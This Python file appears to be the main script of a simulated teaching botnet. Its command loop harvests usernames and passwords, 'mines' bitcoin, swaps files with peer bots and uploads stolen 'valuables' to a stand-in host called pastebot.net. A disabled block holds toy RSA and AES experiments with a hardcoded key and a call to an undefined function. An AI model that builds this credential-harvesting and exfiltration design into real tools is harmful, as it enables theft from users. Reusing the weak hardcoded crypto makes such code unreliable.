import os
import socket
import time
import threading
import sys
import struct
import fractions
from Crypto.Hash import SHA256
from Crypto.PublicKey import RSA
from lib.ScheizerCipher import PrivateKey
from lib.ScheizerCipher import PublicKey

from lib.comms import StealthConn
from lib.evil import bitcoin_mine, harvest_user_pass
from lib.p2p import find_bot, bot_server
from lib.files import download_from_pastebot, filestore, p2p_upload_file, save_valuable, upload_valuables_to_pastebot, \
    valuables
from lib.helpers import read_hex
from Crypto.Cipher import AES


def p2p_upload(fn):
    sconn = find_bot()
    sconn.send(bytes("FILE", "ascii"))
    p2p_upload_file(sconn, fn)


def p2p_echo():
    try:
        sconn = find_bot()
        sconn.send(bytes("ECHO", "ascii"))
        while 1:
            # Read a message and send it to the other bot
            msg = input("Echo> ")
            byte_msg = bytes(msg, "ascii")
            sconn.send(byte_msg)
            # This other bot should echo it back to us
            echo = sconn.recv()
            # Ensure that what we sent is what we got back
            assert (echo == byte_msg)
            # If the msg is X, then terminate the connection
            if msg.lower() == 'x' or msg.lower() == "exit" or msg.lower() == "quit":
                sconn.close()
                break
    except socket.error:
        print("Connection closed unexpectedly")


def phi(n):
    result = n
    i = 2
    while i * i <= n:
        if n % i == 0:
            while n % i == 0:
                n //= i
            result -= result // i
        i += 1
    if n > 1:
        result -= result // n
    return result


def encrypt(k1, k2, msg):
    # bytes(data, "ascii")
    return msg ** k2 % k1


def decrypt(k1, prKey, ciph):
    return ciph ** prKey % k1


def is_prime(n):
    if n == 2 or n == 3:
        return True
    if n < 2 or n % 2 == 0:
        return False
    if n < 9:
        return True
    if n % 3 == 0:
        return False
    r = int(n ** 0.5)
    f = 5
    while f <= r:
        if n % f == 0: return False
        if n % (f + 2) == 0: return False
        f += 6
    return True


def egcd(a, b):
    if a == 0:
        return b, 0, 1
    else:
        g, y, x = egcd(b % a, a)
        return g, x - (b // a) * y, y


def modular_inverse(a, m):
    g, x, y = egcd(a, m)
    if g != 1:
        raise Exception('modular inverse does not exist')
    else:
        return x % m


if __name__ == "__main__":

    if False:



        pastebot_private_key = RSA.importKey(open(os.path.join("pastebot.net", "private.key"), "rb").read())
        pastebot_public_key = RSA.importKey(open(os.path.join("pastebot.net", "public.key"), "rb").read())



        f = open(os.path.join("pastebot.net", "hello.signed"), "rb").read()

        lines = f.split(bytes("\n", "ascii"), 1)
        first_line = int(lines[0])

        print(pastebot_public_key.verify("Caesar".encode(), (first_line, 'x')))

        sys.exit()

        msg = "attack at dawn".encode()
        emsg = pastebot_private_key.encrypt(msg, 'x')[0]
        dmsg = pastebot_public_key.decrypt(emsg)

        new_key = RSA.generate(2048)

        new_priv_key = new_key
        new_pub_key = new_key.publickey()

        assert (msg == dmsg)

        signature = new_priv_key.sign(msg, 'x')
        assert new_pub_key.verify(msg, signature)


        p = 11037271757
        q = 8736028057
        e = 6461335109

        assert is_prime(p)
        assert is_prime(q)
        assert is_prime(e)

        private_key = PrivateKey(p, q, e)
        print("Max length : {}".format(private_key.max_length))
        print("Max bits : {}".format(private_key.max_bits))
        print("Max bytes : {}".format(private_key.max_bytes))

        assert fractions.gcd(e, private_key.t) == 1

        public_key = private_key.get_public_key()

        msg = 'theology'
        msg_int = int.from_bytes(msg.encode(), byteorder='big')
        assert private_key.max_length > msg_int
        # msg_array = [char for char in msg]

        print("Original message: {}".format(msg))
        print("Original message length: {}".format(msg_int))

        encrypted = public_key.encrypt(msg_int)

        print("Encrypted data: {}".format(encrypted))

        decrypted = private_key.decrypt(encrypted)

        print("Decrypted message: {}".format(decrypted))
        print("Decrypted message: {}".format(decrypted.to_bytes(8, byteorder='big')))
        # assert encrypted ** pr_key % n == msg_int ** (pub_key * pr_key) % n
        assert msg_int == decrypted

        msg_hash = SHA256.new()
        msg_hash.update(msg.encode())
        print(msg_hash.hexdigest())
        print([char for char in msg_hash.hexdigest()])
        public_key.encrypt([char for char in msg_hash.hexdigest()])
        msg_hash_int = int.from_bytes(msg_hash.hexdigest().encode()[:2], byteorder='big')
        print(msg_hash_int)

        sys.exit()

        encrypted_data = encrypt(899, 17, 65)
        print("Encrypted data: {}".format(repr(encrypted_data)))
        private_key = crack_key(899, 17)

        print("Cracked private key: {}".format(repr(private_key)))

        decrypted_data = decrypt(899, 593, 53)
        print("Decrypted data: {}".format(decrypted_data))
        sys.exit()

        shared_key = 'askldfjasdgldljsalglsajglasjldsjfoweijfsandblhsaghaiwejgfaldsjglawiejglajglksagllilsigehsgdnbsei'[
                     :32]
        cipher = AES.new(shared_key)

        data = 'this is the new shit'
        print("Original data: {}".format(data))
        print("Original data length: {}".format(len(data)))

        data = bytes(data, "ascii")
        length = 16 - (len(data) % 16)
        data += ' '.encode() * length

        print("Padded data length: {}".format(len(data)))

        encrypted_data = cipher.encrypt(data)

        print("Encrypted data: {}".format(repr(encrypted_data)))
        print("Sending packet of length {}".format(len(encrypted_data)))

        pkt_len_packed = struct.pack('H', len(encrypted_data))

        unpacked_contents = struct.unpack('H', pkt_len_packed)
        pkt_len = unpacked_contents[0]

        decrypted_data = cipher.decrypt(encrypted_data)
        print("Receiving packet of length {}".format(pkt_len))
        print("Encrypted data: {}".format(repr(encrypted_data)))
        print("Decrypted data: {}".format(decrypted_data))
        print("Original data: {}".format(decrypted_data.decode("ascii").rstrip()))

    # Start a new thread to accept P2P echo or P2P upload requests
    thr = threading.Thread(target=bot_server)
    # Daemon threads exit when the main program exits
    # This means the server will shut down automatically when we quit
    thr.setDaemon(True)
    thr.start()
    # Wait for a small amount of time so that the output
    # doesn't play around with our "command prompt"
    time.sleep(0.3)

    while 1:
        # Naive command loop
        # There are better ways to do this, but the code should be clear
        raw_cmd = input("Enter command: ")
        cmd = raw_cmd.split()
        if not cmd:
            print("You need to enter a command...")
            continue
        # P2P Commands
        # Echo is primarily meant for testing (the receiver will echo what it hears back)
        # Upload allows for peer-to-peer file transfer to other bots
        if cmd[0].lower() == "p2p":
            if len(cmd) > 1:
                if cmd[1].lower() == "echo":
                    p2p_echo()
                if cmd[1].lower() == "upload":
                    if len(cmd) == 3:
                        p2p_upload(cmd[2])
                    else:
                        print("Format is 'p2p upload <filename>'")
            else:
                print("The p2p command requires either 'echo' or 'upload' after it")
        # Download a file (update or data) from pastebot.net
        elif cmd[0].lower() == "download":
            if len(cmd) == 2:
                download_from_pastebot(cmd[1])
            else:
                print("The download command requires a filename afterwards")
        # Upload the valuables/secrets the bot has discovered to pastebot.net
        elif cmd[0].lower() == "upload":
            if len(cmd) == 2:
                upload_valuables_to_pastebot(cmd[1])
            else:
                print("The upload command requires a filename afterwards")
        # Mine for Bitcoins
        # This is far more intensive in the real world, but we'll just pretend ;)
        elif cmd[0].lower() == "mine":
            print("Mining for Bitcoins...")
            bit_addr = bitcoin_mine()
            save_valuable("Bitcoin: %s" % bit_addr)
            print("Mined and found Bitcoin address: %s" % bit_addr)
        # Harvest a user's username and password (userpass)
        elif cmd[0].lower() == "harvest":
            userpass = harvest_user_pass()
            save_valuable("Username/Password: %s %s" % userpass)
            print("Found user pass: %s" % (userpass,))
        # List files and valuables (secrets such as userpass & bitcoins) the bot has
        elif cmd[0].lower() == "list":
            print("Files stored by this bot: %s" % ", ".join(filestore.keys()))
            print("Valuables stored by this bot: %s" % valuables)
        # Exit command
        elif cmd[0].lower() == "quit" or cmd[0].lower() == "exit":
            break
        else:
            print("Command not recognised")
